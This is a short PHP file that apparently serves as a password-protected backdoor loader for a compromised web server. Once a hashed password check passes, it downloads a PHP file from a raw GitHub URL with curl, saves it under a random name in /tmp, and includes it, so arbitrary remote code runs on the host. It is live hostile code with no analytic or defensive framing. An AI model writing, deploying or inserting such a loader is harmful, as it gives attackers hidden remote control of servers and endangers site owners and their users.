<?php
session_start();

if (isset($_POST['password']) && !empty($_POST['password'])) {
    $pass = "6669aa769e5bf4125f96badc02e2de15";
    if (md5($_POST['password']) == $pass) {
        $_SESSION['anjing'] = 'anjing';
    }
}

if (isset($_SESSION['anjing']) && $_SESSION['anjing'] == "anjing") {
    $url = 'https://raw.githubusercontent.com/dan1584/asfdas/main/Aks525jkwuy.php';
    
    $targetDir = '/tmp';
    
    if (!is_dir($targetDir)) {
        mkdir($targetDir, 0777, true);
    }
    
    $randomFileName = uniqid() . '.php';
    $targetFile = $targetDir . '/' . $randomFileName;
    
    if (!file_exists($targetFile)) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $response = curl_exec($ch);
        curl_close($ch);
        file_put_contents($targetFile, $response);
    }
    
    include $targetFile;
    die();
}

?>

<form method="post">
<input type="password" name="password">
</form>
